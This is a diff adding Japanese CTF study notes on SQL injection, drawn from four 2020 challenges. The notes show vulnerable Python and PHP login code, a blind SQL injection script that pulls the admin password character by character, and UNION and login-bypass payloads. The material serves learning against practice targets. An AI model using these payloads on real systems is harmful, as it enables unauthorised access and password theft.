@@ -1,4 +1,178 @@
 # writeup
+## blind / identify admin's password (TJCTF 2020  Weak Password)
+http://itsvipul.com/writeups/TJCTF_2020/Weak_Password.html  
+- **entrypoint**  
+ログインページがあって、`' or 1=1--`でログインできるが特にそのあとにFlagとかはない。`admin`のパスワードを特定すればFlagが出るって問題文に書いてある。  
+pythonで以下のようなソースとなっている。  
+```python
+<!-- The following code might be helpful to look at: -->
+
+<!--
+def get_user(username, password):
+    database = connect_database()
+    cursor = database.cursor()
+    try:
+        cursor.execute('SELECT username, password FROM `userandpassword` WHERE username=\'%s\' AND password=\'%s\'' % (username, password))
+    except:
+        return render_template("failure.html")
+    row = cursor.fetchone()
+    database.commit()
+    database.close()
+    if row is None: return None
+    return (row[0],row[1])
+-->
+```
+`(Select unicode(substr(password,1,1)) from userandpassword limit 1 offset 0) > 50`みたいなbinary searchのBlindで特定する。  
+- **payload**  
+```python
+#! /usr/bin/python3
+import requests
+import string
+
+def inject(cmd):
+    url = "https://weak_password.tjctf.org/login"
+    data = {"username":"admin' AND {} -- ".format(cmd),"password":"leetcode"}
+    #print(data)
+    r = requests.post(url,data=data)
+    #print(r.text)
+    valid = "Congratulations"
+    if(valid in r.text):
+        return True
+    else:
+        return False
+
+
+col_1 = "username"
+col_2 = "password"
+db = "userandpassword"
+
+user = "admin"
+
+#cmd = "Select unicode(substr(password,1,1)) from {} limit 1 offset 0 > 0 ".format(db)
+flag=""
+for i in range(1,10):
+    l = 97 
+    r = 123
+    # l = 0
+    # r = 100
+    prev_mid = -1
+    mid = int((l+r)/2)
+    while(prev_mid!=mid):
+        cmd = "(Select unicode(substr(password,{},{})) from userandpassword limit 1 offset 0) > {}".format(i,i,mid)
+        #cmd = "(Select length(password) from userandpassword limit 1 offset 1) > {}".format(mid)
+        val = inject(cmd)
+        if(val):
+            l = mid
+        else:
+            r=mid
+        prev_mid=mid
+        mid = int((l+r)/2)
+
+    flag+=chr(mid+1)
+    print(flag)
+```
+## login bypass (TJCTF 2020 Login Sequel)
+https://github.com/CsEnox/TJCTFWriteups/blob/master/SequelLogin.md  
+- **entrypoint**  
+loginページがあるらしい。  
+- **payload**  
+`admin'/*`でログインするとフラグが出たらしい。  
+## union query / Stored SQL Injection (HackPack CTF 2020 Online Birthday Party)
+https://www.hamayanhamayan.com/entry/2020/04/30/104927  
+- **entrypoint**  
+同じ誕生日のユーザーを検索してくれるサイトらしい。  
+`/index.php` トップページ  
+`/account.php` ログイン、新規登録ができる  
+`/profile.php` ログイン後に出るページ  
+新規登録するときに入力する誕生日を使ってSQLを実行しているはずなのでここにSQLInjectionできるか試す。  
+`'`を入力するとErrorを返してくれるのでSQLInjection可能とわかる。  
+`a'#`で成功したのでMySQL。  
+`a' UNION SELECT DISTINCT TABLE_NAME, null from INFORMATION_SCHEMA.COLUMNS #`でテーブル一覧を取得できる。  
+```txt
+CHARACTER_SETS,COLLATIONS,COLLATION_CHARACTER_SET_APPLICABILITY,COLUMNS,COLUMN_PRIVILEGES,ENGINES,EVENTS,FILES,GLOBAL_STATUS,GLOBAL_VARIABLES,KEY_COLUMN_USAGE,OPTIMIZER_TRACE,PARAMETERS,PARTITIONS,PLUGINS,PROCESSLIST,PROFILING,REFERENTIAL_CONSTRAINTS,ROUTINES,SCHEMATA,SCHEMA_PRIVILEGES,SESSION_STATUS,SESSION_VARIABLES,STATISTICS,TABLES,TABLESPACES,TABLE_CONSTRAINTS,TABLE_PRIVILEGES,TRIGGERS,USER_PRIVILEGES,VIEWS,INNODB_LOCKS,INNODB_TRX,INNODB_SYS_DATAFILES,INNODB_FT_CONFIG,INNODB_SYS_VIRTUAL,INNODB_CMP,INNODB_FT_BEING_DELETED,INNODB_CMP_RESET,INNODB_CMP_PER_INDEX,INNODB_CMPMEM_RESET,INNODB_FT_DELETED,INNODB_BUFFER_PAGE_LRU,INNODB_LOCK_WAITS,INNODB_TEMP_TABLE_INFO,INNODB_SYS_INDEXES,INNODB_SYS_TABLES,INNODB_SYS_FIELDS,INNODB_CMP_PER_INDEX_RESET,INNODB_BUFFER_PAGE,INNODB_FT_DEFAULT_STOPWORD,INNODB_FT_INDEX_TABLE,INNODB_FT_INDEX_CACHE,INNODB_SYS_TABLESPACES,INNODB_METRICS,INNODB_SYS_FOREIGN_COLS,INNODB_CMPMEM,INNODB_BUFFER_POOL_STATS,INNODB_SYS_COLUMNS,INNODB_SYS_FOREIGN,INNODB_SYS_TABLESTATS,users
+```
+usersテーブルを調べることにして、`a' UNION SELECT COLUMN_NAME, null FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users' #`でカラム一覧を取得する。  
+```txt
+id,username,password,bday
+```
+`a' UNION SELECT password, bday FROM users #`でFlagが得られたらしい。  
+- **payload**  
+`a' UNION SELECT password, bday FROM users #`
+## login bypass / pass=''=0 / PHP Type Juggling (Houseplant CTF 2020 I don’t like needles)
+https://sec.hamayanhamayan.com/2020/04/27/houseplant-ctf-2020-web-writeups/#i-dont-like-needles  
+- **entrypoint**  
+`?sauce`というワードがHTMLに書かれていて、これにアクセスするとソースコードが得られるらしい。  
+`mysqli_query($connection, "SELECT * FROM users WHERE username='" . $username . "' AND password='" . $password . "'", MYSQLI_STORE_RESULT);`にSQLInjectionできそう。  
+`if (mysqli_fetch_array($result, MYSQLI_ASSOC)["username"] == "flagman69") `で`mysqli_fetch_array`で連想配列にSQL結果を整形して、usernameが`flagman69`と一致しているかどうかチェックしている。  
+`==`で比較しているのでType Jugglingの脆弱性もありそう。  
+`strpos()`によってpassword欄には`1`という文字は使えない。  
+```php
+<?php
+
+    if ($_SERVER['REQUEST_METHOD'] == "POST") {
+
+        require("config.php");
+
+        if (isset($_POST["username"]) && isset($_POST["password"])) {
+
+            $username = $_POST["username"];
+            $password = $_POST["password"];
+
+            if (strpos($password, "1") !== false) {
+                echo "<p style='color: red;'>Auth fail :(</p>";
+            } else {
+
+                $connection = new mysqli($SQL_HOST, $SQL_USER, $SQL_PASS, $SQL_DB);
+                $result = mysqli_query($connection, "SELECT * FROM users WHERE username='" . $username . "' AND password='" . $password . "'", MYSQLI_STORE_RESULT);
+
+                if ($result === false) {
+                    echo "<p style='color: red;'>I don't know what you did but it wasn't good.</p>";
+                } else {
+                    if ($result->num_rows != 0) {
+                        if (mysqli_fetch_array($result, MYSQLI_ASSOC)["username"] == "flagman69") {
+                            echo "<p style='color: green;'>" . $FLAG . " :o</p>";
+                        } else {
+                            echo "<p style='color: green;'>Logged in :)</p>";
+                        }
+                    } else {
+                        echo "<p style='color: red;'>Auth fail :(</p>";
+                    }
+                }
+
+            }
+        }
+    }
+
+?>
+```
+username:`flagman69`,password:`' OR 0 = 0#`でログインは成功するが、`0=0`のため全レコードが条件に一致し、すべてのレコードを取得するためusername:`flagman69`のレコードが先頭に来ない。  
+`limit 1,1`や`offset 1`を使えない。  
+username:`flagman69`,password:`'=0#`とすると、`username='flagman69' and password=''=0`となり、`password=''=0`はTrueとなってpasswordに正しい文字列を入力したことと同じになり、`flagman69`だけが返る。  
+他にもusername:`flagman' #`でも可能！  
+PHP Type Jugglingを使った`SELECT * FROM demo where name="testaa" union select 0,0,0`で`if(0 == "flagman69")`とさせて条件を突破させる方法もありそう。  
+- **payload**  
+username:`flagman69`,password:`'=0#`  
+username:`flagman' #`  
+`a' union select 0,0,0 #`  
+## 
+- **entrypoint**  
+- **payload**  
+
+## 
+- **entrypoint**  
+- **payload**  
+
+## 
+- **entrypoint**  
+- **payload**  
+
+## 
+- **entrypoint**  
+- **payload**  
+
+## 
+- **entrypoint**  
+- **payload**  
 
 # 常設の練習
 ## picoCTF 2019
